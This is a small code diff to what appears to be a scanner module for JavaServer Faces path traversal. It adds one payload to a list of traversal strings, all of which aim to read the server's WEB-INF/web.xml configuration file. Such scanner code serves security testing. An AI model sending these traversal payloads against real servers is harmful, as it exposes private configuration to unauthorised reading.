@@ -55,8 +55,9 @@ public class JavaServerFacesTraversal implements IModule {
         List<URL> payloads = new ArrayList<>();
         List<String> jsfTraversal = new ArrayList<>();
         jsfTraversal.add("javax.faces.resource.../WEB-INF/web.xml.jsf");
+        jsfTraversal.add("javax.faces.resource.../WEB-INF/web.xml.xhtml");
         jsfTraversal.add("javax.faces.resource./WEB-INF/web.xml.jsf?ln=..");
-
+        
         jsfTraversal.add("/faces/javax.faces.resource/web.xml?ln=..\\\\WEB-INF");
         jsfTraversal.add("/faces/javax.faces.resource/..\\\\WEB-INF/web.xml");
 
